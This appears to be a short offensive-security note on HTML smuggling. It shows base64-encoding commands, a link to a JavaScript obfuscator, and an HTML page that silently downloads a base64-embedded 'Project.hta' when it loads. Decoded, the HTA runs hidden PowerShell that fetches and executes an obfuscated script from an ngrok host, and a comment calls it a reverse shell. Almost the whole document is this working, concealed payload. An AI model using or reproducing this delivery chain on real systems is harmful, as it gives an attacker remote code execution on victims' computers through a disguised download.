##### get B64:
```
cat m.zip | base64 | tr -d '\n' | tee aa
base64 m.zip | tr -d '\n' | tee aa
```

##### obfuscate js:
<https://obfuscator.io/>

```html
<html>
    <body>
        <script>
            function base64ToArrayBuffer(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            
            var bytes = new Uint8Array( len );
                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
                return bytes.buffer;
            }

            // 32bit simple reverse shell
            var file = 'PGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5Qb3dlclNoZWxsIFJ1bm5lcjwvdGl0bGU+DQo8SFRBOkFQUExJQ0FUSU9OIA0KICAgICBBUFBMSUNBVElPTk5BTUU9IlBvd2VyU2hlbGwgUnVubmVyIg0KICAgICBJRD0iUG93ZXJTaGVsbFJ1bm5lciINCiAgICAgU0NST0xMPSJubyINCiAgICAgU0lOR0xFSU5TVEFOQ0U9InllcyINCiAgICAgV0lORE9XU1RBVEU9Im1pbmltaXplIg0KPg0KPC9oZWFkPg0KPHNjcmlwdCBsYW5ndWFnZT0iVkJTY3JpcHQiPg0KICAgIFN1YiBXaW5kb3dfT25Mb2FkDQogICAgICAgICcgQ3JlYXRlIFdTY3JpcHQgU2hlbGwNCiAgICAgICAgU2V0IG9ialNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCiAgICAgICAgDQogICAgICAgICcgUnVuIFBvd2VyU2hlbGwgY29tbWFuZA0KICAgICAgICBvYmpTaGVsbC5SdW4gInBvd2Vyc2hlbGwuZXhlIC1ub3AgLWVwIGJ5cGFzcyAtV2luZG93U3R5bGUgSGlkZGVuIElFWCAoaXdyIC11c2ViYXNpY3BhcnNpbmcgaHR0cDovLzAudGNwLmV1Lm5ncm9rLmlvOjE0NTU1L29iZnVzY2F0ZWQucHMxKSIsIDEsIGZhbHNlDQogICAgICAgIA0KICAgICAgICAnIENsb3NlIHRoZSBIVEENCiAgICAgICAgd2luZG93LmNsb3NlDQogICAgRW5kIFN1Yg0KPC9zY3JpcHQ+DQo8Ym9keT4NCjwvYm9keT4NCjwvaHRtbD4NCg=='
            var data = base64ToArrayBuffer(file);
            var blob = new Blob([data], {type: 'octet/stream'});
            var fileName = 'Project.hta';

            if (window.navigator.msSaveOrOpenBlob) {
                window.navigator.msSaveOrOpenBlob(blob,fileName);
            } else {
                var a = document.createElement('a');
                console.log(a);
                document.body.appendChild(a);
                a.style = 'display: none';
                var url = window.URL.createObjectURL(blob);
                a.href = url;
                a.download = fileName;
                a.click();
                window.URL.revokeObjectURL(url);
            }
        </script>
    </body>
</html>
```
